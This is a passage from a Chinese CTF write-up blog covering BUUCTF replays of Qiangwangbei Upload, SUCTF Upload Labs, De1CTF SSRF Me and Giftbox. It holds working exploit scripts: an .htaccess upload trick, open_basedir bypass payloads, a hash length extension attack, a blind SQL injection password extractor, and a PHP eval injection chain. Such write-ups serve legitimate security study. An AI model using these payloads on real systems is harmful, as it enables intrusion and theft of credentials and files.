application/x-httpd-php .ooo\nphp_value '</span></span><br><span class="line">    <span class="string">'auto_append_file "php://filter/convert.base64-decode/resource=a.ooo"'</span>)&#125;</span><br><span class="line">r = requests.post(url, files=file1).text</span><br><span class="line">print(r)</span><br><span class="line">r = requests.post(url, files=file2).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><br><img src="/2020/09/14/buuctf1/4.png" alt><br>访问网站flag文件存在提示信息</p><blockquote><p>hhhh<br>This is fake flag<br>But I heard php7.2-fpm has been initialized in unix socket mode!<br>~    </p></blockquote><p>需要我们绕过open_basedir限制，我们可以选择绕过该限制，也可以选择直接绕过disable_functions（推荐这种方法，蚁剑有插件）</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload&#x2F;tmp_bad194011f5ad0cf609c77ad222e50d6&#x2F;a.ooo?snow&#x3D;chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);var_dump(file_get_contents(%27&#x2F;THis_Is_tHe_F14g%27));</span><br></pre></td></tr></table></figure></p><h1 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h1><p>php://filter/resource=phar://./upload/bad194011f5ad0cf609c77ad222e50d6/b5e9b4f86ce43ca65bd79c894c4a924c.gif</p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>题目给出源码和提示<code>flag is in ./flag.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>题目很明显是在考察哈希长度扩展攻击，但是在读文件的时候过滤了gopher和file协议，不过找到一篇<a href="http://13.58.107.157/archives/8936" target="_blank" rel="noopener">文章(http://13.58.107.157/archives/8936)</a>说可以使用<code>local_file</code>协议，该协议是linux下支持的一个协议，也可以实现读文件<br><img src="/2020/09/14/buuctf1/5.png" alt><br>流程如下：<br>先访问geneSign页面生成签名，这里要把我们的参数设定好，由于提示已经给出了flag位置，所以通过<code>local_file:flag.txt</code>即可读到flag<br>在生成签名之后，用hashpump生成即可<br><img src="/2020/09/14/buuctf1/6.png" alt></p><blockquote><p>PS: <code>input sig</code> 填写我们获得的签名，<code>input data</code>填写之前生成签名的明文<strong>最后</strong>几位字符，<code>input key len</code>填写明文总长度减去input data长度后的值，最后填写我们要添加的值。</p></blockquote><p>将结果中的<code>\x</code>替换为<code>%</code>后按照要求提交即可，exp如下(cookie要在headers中提交，否则会报错)：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://e78b915e-84fa-4293-a7eb-51e747ff6e43.node3.buuoj.cn/'</span></span><br><span class="line">sig = requests.get(url+<span class="string">'geneSign?param=local_file:flag.txt'</span>).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(sig)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用hashpump生成替换值</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>: </span><br><span class="line">    <span class="string">r"action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read; sign=a21ff75fdafd472a4e5abda397747fa0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = requests.get(url+<span class="string">'De1ta?param=local_file:flag.txt'</span>,headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(json.loads(flag)[<span class="string">'data'</span>])</span><br></pre></td></tr></table></figure></p><h1 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h1><p>这题出的挺不错的，虽然整体考点并不难，但是却很考验综合能力，题目给出了源码（看了大佬wp才知道，原题是没有给源码的）<br>首先得说师傅这前端做的真是漂亮，佩服。题目给了一个模拟shell，可以执行简单的命令，简单<code>usage.md</code>可以看到一些主要命令，但是需要登录<br><img src="/2020/09/14/buuctf1/7.png" alt><br>登录界面进行测试发现存在注入，没有任何过滤，不过由于输入空格会被当做命令分隔符，所以需要用注释符来绕过空格，查看浏览记录发现每次请求时需要输入totp值，查看js代码发现这是Google的一个一次性身份验证算法，查看<code>main.js</code>有一段注释信息，基本给出了totp算法的各项参数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Developer Notes]</span></span><br><span class="line"><span class="comment">OTP Library for Python located in js/pyotp.zip</span></span><br><span class="line"><span class="comment">Server Params:</span></span><br><span class="line"><span class="comment">digits = 8</span></span><br><span class="line"><span class="comment">interval = 5</span></span><br><span class="line"><span class="comment">window = 1</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><br>python下正好就有相应库，那么编写盲注脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">sec = <span class="string">'GAXG24JTMZXGKZBU'</span></span><br><span class="line">totp = pyotp.TOTP(sec, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">url = <span class="string">'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">payload_pre = <span class="string">"?totp=&#123;&#125;&amp;a="</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">34</span>, <span class="number">127</span>):</span><br><span class="line">        tmp = parse.quote(<span class="string">"login ad'/**/or/**/ascii(substr((select/**/password/**/from/**/users/**/where/**/username='admin'),&#123;&#125;,1))=&#123;&#125;# pa"</span>.format(len(password)+<span class="number">1</span>, j))</span><br><span class="line">        res = requests.get(url+payload_pre.format(totp.now()) + tmp).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password incorrect'</span> <span class="keyword">in</span> res:</span><br><span class="line">            password += chr(j)</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">127</span>:</span><br><span class="line">            print(<span class="string">'finished.'</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><br>得到密码<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code>，密码中给出了命令提示<code>sh0w_hiiintttt_23333</code>，尝试运行一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure><br>那么基本就是命令执行了，登录之后，执行<code>targeting</code>命令设定参数，存在过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkCode</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">    $table=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    <span class="keyword">if</span> (strlen($code)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'code too long.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($code); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos($table,$code[$i])===<span class="keyword">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'bad code.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($sandbox.<span class="string">'missiles/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>.$code))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'target existed.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPosition</span><span class="params">($position)</span></span>&#123;</span><br><span class="line">    $table=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#125;)$(&#123;_+-,.'</span>;</span><br><span class="line">    <span class="keyword">if</span> (strlen($position)&gt;<span class="number">12</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'position too long.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($position); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos($table,$position[$i])===<span class="keyword">FALSE</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'bad position.'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在设定参数之后，如<code>targeting a b</code>，后台会把我们的处理为<code>$a=&quot;b&quot;</code>，然后带入eval中执行，由于使用了双引号包裹变量导致了漏洞，因为在PHP中，双引号包裹的变量会被PHP尝试解析<a href="https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing</a>，利用此特性我们就可以进行函数执行，尝试执行phpinfo()，<code>targeting a ${phpinfo()}</code>，将返回页面保存到本地打开可以看到函数执行信息<br><img src="/2020/09/14/buuctf1/8.png" alt><br><img src="/2020/09/14/buuctf1/9.png" alt><br>可以看到题目设置了basedir，需要进行绕过，payload如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">sec = <span class="string">'GAXG24JTMZXGKZBU'</span></span><br><span class="line">totp = pyotp.TOTP(sec, digits=<span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(sig)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    payload = parse.quote(<span class="string">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>)</span><br><span class="line">    con = session.get(url.format(payload, sig)).text</span><br><span class="line">    print(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">(sig)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    payload = <span class="string">'destruct'</span></span><br><span class="line">    con = session.get(url.format(payload, sig)).text</span><br><span class="line">    print(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">targeting</span><span class="params">(sig, payload)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    con = session.get(url.format(parse.quote(payload), sig)).text</span><br><span class="line">    print(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">(sig)</span>:</span></span><br><span class="line">    url = base_url + <span class="string">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class="line">    payload = <span class="string">'launch'</span></span><br><span class="line">    con = session.get(url.format(payload, sig)).text</span><br><span class="line">    flag =  re.findall(<span class="string">r'(flag\&#123;[a-z0-9\-]+\&#125;)'</span>,con)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        print(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(con)</span><br><span class="line">login(totp.now())</span><br><span class="line">destruct(totp.now())</span><br><span class="line"></span><br><span class="line"><span class="comment"># phpinfo()</span></span><br><span class="line"><span class="comment"># payloads = ['targeting a $&#123;phpinfo()&#125;']</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># scandir('/')</span></span><br><span class="line"><span class="comment"># payloads = ['targeting a chdir','targeting b img','targeting c &#123;$a($b)&#125;','targeting d ini_set','targeting e open_basedir',</span></span><br><span class="line"><span class="comment">#    'targeting f ..','targeting g &#123;$d($e,$f)&#125;','targeting h &#123;$a($f)&#125;','targeting i &#123;$a($f)&#125;','targeting j chr',</span></span><br><span class="line"><span class="comment">#    'targeting k &#123;$j(47)&#125;','targeting l &#123;$d($e,$k)&#125;','targeting m scandir','targeting n print_r','targeting o &#123;$n($m($k))&#125;']</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file_get_contents('/flag')</span></span><br><span class="line">payloads = [<span class="string">'targeting a chdir'</span>,<span class="string">'targeting b img'</span>,<span class="string">'targeting c &#123;$a($b)&#125;'</span>,<span class="string">'targeting d ini_set'</span>,<span class="string">'targeting e open_basedir'</span>,</span><br><span class="line">    <span class="string">'targeting f ..'</span>,<span class="string">'targeting g &#123;$d($e,$f)&#125;'</span>,<span class="string">'targeting h &#123;$a($f)&#125;'</span>,<span class="string">'targeting i &#123;$a($f)&#125;'</span>,<span class="string">'targeting j chr'</span>,</span><br><span class="line">    <span class="string">'targeting k &#123;$j(47)&#125;'</span>,<span class="string">'targeting l &#123;$d($e,$k)&#125;'</span>,<span class="string">'targeting m flag'</span>,<span class="string">'targeting n $k$m'</span>,<span class="string">'targeting o file_get_'</span>,</span><br><span class="line">    <span class="string">'targeting p contents'</span>,<span class="string">'targeting q $o$p'</span>,<span class="string">'targeting r &#123;$q($n)&#125;'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> payloads:</span><br><span class="line">    targeting(totp.now(), each)</span><br><span class="line">launch(totp.now())</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[强网杯 2019]Upload&lt;/p&gt;
    
    </summary>
    
      <category term="复现" scheme="http://chaosec.top/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
      <category term="Web" scheme="http://chaosec.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Rootme网站做题记录(三)</title>
    <link href="http://chaosec.top/2020/09/13/rootme2/"/>
    <id>http://chaosec.top/2020/09/13/rootme2/</id>
    <published>2020-09-13T14:41:21.000Z</published>
    <updated>2020-09-14T13:34:31.943Z</updated>
    
    <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Password plz..." />    <label for="pass">Password plz...</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1+jiybMxrjN/+SCpLaSheRRcfoTt5eaS1RUewBGJ7T6Rt4ZQaWNHGMJLK7uB5t4SRUgyTHVPekIudmMg3X76mVGZ5KbQOG03nkPsUMab5bJZZuoMgH7CqT4z2MdSoLTD9vV2sd+c3gGBBnd+gGEOZhClEZIJvox9YJ6Va8TwjyXAfWaW8lfxi2Qpsmiph9lETtgkRR08/Fz/lH9dxQrcw/SIqT+w1OR8mNfyOqyQvBt1n2ZDLKWE7nzjFKN4tCbpYd3WvvAUDNYJaKoGzxJ2hyzRa/XHwcnH+JO4IY8pxYWXkL+eT0ZeghzZq6JYF/bdkQTz4HT4K1+ZTDMvYToZJmMqKLt3FOjbYi4G4bW9XoSFkHE69FzCqDNUS07EWrs6zXrPs743wDg9hC3am9doqroICLbxCHkBqOJH7SlW37ERMvDuge6ARx0/LIsgmPaKf1l9y8ROVlzPmVK0yxoom+4qnifQ50zSam9GXnnswM037vj/sUhmJJmEdGBbKkIZ+efmVK+tEG5oMNkpycbLIIeYxm043RamnuA69JdBCVA3ST0O92lPWhpQ5aayLq0Wvl+vTy/YJFQXVxJHxFzLYxU4+yas9qIUiZepWL4tAOVlI6JDj6Td7gaswMgn6ogw/ry7GvfhnhrCg/6o9rlRHBXYQmxKmmKta5PkFaf/GW5Buj+YPfD/1ZBbQhuJOWr+w69lucpoLOcTLMMUVYkbk8ZhxQAGeICgX3TiUuWqTX5LijartEN7wdKYK4OQEvuMcwq1ddeKiQHqexN/zuSD8mrcmCsBW12ugZH30pVi08/Z2cWMnsGyqa3XYZupYlSRkfslmCChsYtbOjs87Gk6rrRAuj4e01K8eDmDjzsXMl/GLmZJ1FyWSBjCHPM3O1pduQi1zFZrTPkW3bNALjMQNrCktLYHW9u6eiAFCuGW453j+BYZXpreTN5XOq2gp2oKUobqIqu5Q5FeKo0kTEvUDqK94TM7yfkJzxUx8dVcrmpxqazvvpaLAj86MMb4GkieXGJ8RF+NY1UJp5LSPAvfWdPWokDXth7zTXx4MT0VzkSZy4/A3bk6uuE0hMOVps4/qQZBPdxfN5HWWTqhFN0ewGTD5iHwDFWHkX3/+Y6cUsl